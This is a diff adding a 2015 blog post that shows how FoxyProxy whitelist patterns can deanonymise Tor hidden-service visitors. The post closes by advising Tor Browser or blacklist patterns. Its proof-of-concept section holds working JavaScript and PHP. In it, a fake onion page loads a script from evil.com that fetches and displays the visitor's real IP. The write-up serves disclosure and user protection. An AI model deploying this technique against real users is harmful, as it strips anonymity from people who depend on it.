@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="utf-8" />
+        <title>Breaking Anonymity With FoxyProxy's Whitelist Pattern</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+
+        <!--[if IE]>
+            <script src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">gbsn </a></h1>
+                <nav><ul>
+                    <li class="active"><a href="/category/privacy.html">privacy</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/breaking-anonymity-with-foxyproxys-whitelist-pattern.html" rel="bookmark"
+           title="Permalink to Breaking Anonymity With FoxyProxy's Whitelist Pattern">Breaking Anonymity With FoxyProxy's Whitelist Pattern</a></h1>
+    </header>
+
+    <div class="entry-content">
+<footer class="post-info">
+        <abbr class="published" title="2015-11-23T00:00:00+01:00">
+                Published: mån 23 november 2015
+        </abbr>
+
+        <address class="vcard author">
+                By                         <a class="url fn" href="/author/gbsn.html">gbsn</a>
+        </address>
+<p>In <a href="/category/privacy.html">privacy</a>.</p>
+<p>tags: <a href="/tag/tor.html">Tor</a> <a href="/tag/foxyproxy.html">FoxyProxy</a> <a href="/tag/hidden-service.html">Hidden Service</a> </p>
+</footer><!-- /.post-info -->      <p>FoxyProxy is a popular proxy management tool with 311,549 users on Firefox and 181,624 users on Google Chrome. It’s being recommended around the web for easily managing your proxy configuration but it can cause you problems unless you’re careful.</p>
+<p>You can use FoxyProxy the following ways</p>
+<ul>
+<li>Use proxies based on their pre-defined patterns and priorities</li>
+<li>Use a specific Proxy for all requests</li>
+</ul>
+<p>These patterns can consist of</p>
+<ul>
+<li>Regex or wildcards</li>
+<li>Whitelist or Blacklist</li>
+</ul>
+<p>We’re going to take a look at how it’s possible to deanonymize anyone using the pre-defined whitelist pattern.</p>
+<h2>Setup</h2>
+<p>Let’s add a new <em>Tor</em> socks5 proxy using localhost:9050 and the pattern <em>onion/</em></p>
+<p><img alt="" src="/images/foxyproxy1.png"></p>
+<p>You have probably already figured out where I’m going with this. The issue here is that anything that does not match this pattern will use the default proxy.</p>
+<h2>Proof of Concept</h2>
+<p>Our PoC will consist of</p>
+<ul>
+<li>evil.com/fun.js</li>
+<li>evil.com/ip.php</li>
+<li>illegaldrugsq2wm.onion/poc.php (this is a fake hidden service)</li>
+</ul>
+<p>fun.js</p>
+<div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">httpGet</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">xmlHttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;http://evil.com/ip.php&quot;</span><span class="p">,</span> <span class="kc">false</span> <span class="p">);</span>
+    <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span> <span class="kc">null</span> <span class="p">);</span>
+    <span class="k">return</span> <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;Real IP: &quot;</span> <span class="o">+</span> <span class="nx">httpGet</span><span class="p">());</span>
+</pre></div>
+
+
+<p>ip.php</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Access-Control-Allow-Origin: *&#39;</span><span class="p">);</span> <span class="c1">// CORS</span>
+<span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>Here’s our our hidden service page:</p>
+<p>illegaldrugsq2wm.onion/poc.php</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>FoxyProxy pattern whitelist PoC<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="cp">&lt;?php echo &quot;IP: &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;] . &quot;&lt;br&gt;&quot;; ?&gt;</span> // this should be 127.0.0.1
+    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://evil.com/fun.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span> // loads our fun.js
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+
+
+<ol>
+<li>FoxyProxy loads <strong>illegaldrugsq2wm.onion/poc.php</strong> using <em>Tor</em> proxy based on the pattern <em>*onion/*</em></li>
+<li><strong>illegaldrugsq2wm.onion/poc.php</strong> loads <strong>evil.com/fun.js</strong> using <em>Default</em> proxy</li>
+<li><strong>evil.com/fun.js</strong> requests <strong>evil.com/ip.php</strong></li>
+<li><strong>evil.com/fun.js</strong> sends the result from <strong>ip.php</strong> back to <strong>illegaldrugsq2wm.onion/poc.php</strong></li>
+</ol>
+<p><img alt="" src="/images/foxyproxy2.png"></p>
+<p>I know what you’re thinking. This is stupid and trivial. Nobody would do this, right? Here are a few guides that recommend predefined whitelist patterns for browsing Hidden Services:</p>
+<ul>
+<li><a href="https://gist.github.com/gdamjan/9714094">https://gist.github.com/gdamjan/9714094</a></li>
+<li><a href="http://www.ehow.com/how_7500941_use-foxy-proxy-tor-privoxy.html">http://www.ehow.com/how_7500941_use-foxy-proxy-tor-privoxy.html</a></li>
+<li><a href="http://techmeout.org/accessing-the-darknet-stay-anonymous-online/">http://techmeout.org/accessing-the-darknet-stay-anonymous-online/</a></li>
+<li><a href="http://nightg0at.blogspot.com/2011/06/why-foxy-proxy-torbutton.html">http://nightg0at.blogspot.com/2011/06/why-foxy-proxy-torbutton.html</a></li>
+<li><a href="https://lilithlela.cyberguerrilla.org/?p=1795">https://lilithlela.cyberguerrilla.org/?p=1795</a></li>
+</ul>
+<h2>Conclusion</h2>
+<p>Use the <a href="https://www.torproject.org/projects/torbrowser.html.en">Tor Browser Bundle!</a> Seriously. If you insist on using FoxyProxy make sure you’re either using a blacklist pattern or switching to using your proxy for all the requests.</p>
+<p>This naturally not only related to FoxyProxy. Any proxy handler that support whitelist patterns and doesn’t load all the requests on the matching URL through he proxy will be affected.</p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+                <div class="blogroll">
+                        <h2>links</h2>
+                        <ul>
+                            <li><a href="http://getpelican.com/">Pelican</a></li>
+                            <li><a href="http://python.org/">Python.org</a></li>
+                            <li><a href="http://jinja.pocoo.org/">Jinja2</a></li>
+                            <li><a href="#">You can modify those links in your config file</a></li>
+                        </ul>
+                </div><!-- /.blogroll -->
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+
+                            <li><a href="#">You can add links in your config file</a></li>
+                            <li><a href="#">Another social link</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+        <footer id="contentinfo" class="body">
+                <address id="about" class="vcard body">
+                Proudly powered by <a href="http://getpelican.com/">Pelican</a>, which takes great advantage of <a href="http://python.org">Python</a>.
+                </address><!-- /#about -->
+
+                <p>The theme is by <a href="http://coding.smashingmagazine.com/2009/08/04/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
+        </footer><!-- /#contentinfo -->
+
+</body>
+</html>
